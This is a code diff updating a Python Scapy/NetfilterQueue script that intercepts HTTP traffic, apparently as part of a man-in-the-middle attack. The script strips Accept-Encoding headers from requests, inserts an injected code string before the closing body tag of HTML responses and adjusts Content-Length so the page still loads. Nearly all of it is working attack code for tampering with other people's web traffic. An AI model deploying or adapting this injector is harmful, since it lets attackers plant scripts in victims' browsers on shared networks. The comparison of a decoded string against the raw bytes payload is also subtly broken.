@@ -19,55 +19,55 @@ def set_load(packet, load):
     del packet[IP].len
     del packet[IP].chksum
     del packet[TCP].chksum
-    if packet.haslayer(UDP):
-        del packet[UDP].len
-        del packet[UDP].chksum
     return packet
 
 def process_packet(packet):
+    # convert the raw netfilter packet into a Scapy packet
     scapy_packet= IP(packet.get_payload())
     if scapy_packet.haslayer(Raw):
-        load = scapy_packet[Raw].load
-        if scapy_packet.haslayer(TCP):
-            # print("\n[+] Packet has layer TCP")
-            if scapy_packet[TCP].dport == 80:
-                print("[+] HTTP Request:  ")
-                # Find "Accept-Encoding" in payload, replace with ""
-                load = re.sub(
-                    "Accept-Encoding:.*?\\r\\n",
-                    "",
-                    load,
-                    flags=re.IGNORECASE | re.MULTILINE
-                )
+        # let's try and manage errors without crashing the script
+        try:
+            # grab the load from the HTTP Raw layer
+            # .decode() we now wanna convert bytes object to string for python3
+            load = scapy_packet[Raw].load.decode()
 
-            elif scapy_packet[TCP].sport == 80:
-                print("[+] HTTP Response:  ")
-                # print(scapy_packet.show())
+            # 1. HANDLE REQUESTS (Going to the Server)
+            if scapy_packet.haslayer(TCP) and scapy_packet[TCP].dport == 80:
+                print("[+] HTTP Request Intercepted:  ")
+                # Strip encoding to prevent compression
+                # Find "Accept-Encoding" in payload, replace with ""
+                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+
+            # 2. HANDLE RESPONSES (Coming from the Server)
+            elif scapy_packet.haslayer(TCP) and scapy_packet[TCP].sport == 80:
+                print("[+] HTTP Response Intercepted:  ")
                 # method replace string with another string
                 load = load.replace("</body>", injection_code + "</body>")
-                # return the Content-Length value, but not Content-Lenth, from regex search
+                # Update Content-Length so the browser doesn't cut off the end of the page
                 content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
-                # if we return a value from re.search
-                if content_length_search:
-                    # assign the second element in the group to a var
+                # if value, and, check this is a html response, not an image etc
+                if content_length_search and "text/html" in load:
                     content_length = content_length_search.group(1)
-                    # calculate the new content length
-                    new_content_length = 0
                     new_content_length = int(content_length) + len(injection_code)
-                    # Assign the new content length to load
                     load = load.replace(content_length, str(new_content_length))
 
-            # if load updated, set the load to new_packet, set new_packet as packet
-            if load != scapy_packet[Raw].load:
-                # Create a new packet
-                new_packet = set_load(scapy_packet, load)
-                # set the new packet with the updated payload as the packet
-                packet.set_payload(str(new_packet))
+                # 3. APPLY CHANGES
+                if load != scapy_packet[Raw].load:
+                    new_packet = set_load(scapy_packet, load)
+                    packet.set_payload(bytes(new_packet))
+        except UnicodeDecodeError:
+            pass
 
+    # FORWARD the packet to its destination.
     packet.accept()
 
 
 if __name__ == "__main__":
-    queue = netfilterqueue.NetfilterQueue()
-    queue.bind(1, process_packet)
-    queue.run()
+    try:
+        print("[*] Initializing NetfilterQueue...")
+        queue = netfilterqueue.NetfilterQueue()
+        queue.bind(3, process_packet)
+        queue.run()
+    except KeyboardInterrupt:
+        print("\n[!] Ctrl+C detected. Unbinding queue and exiting...")
+
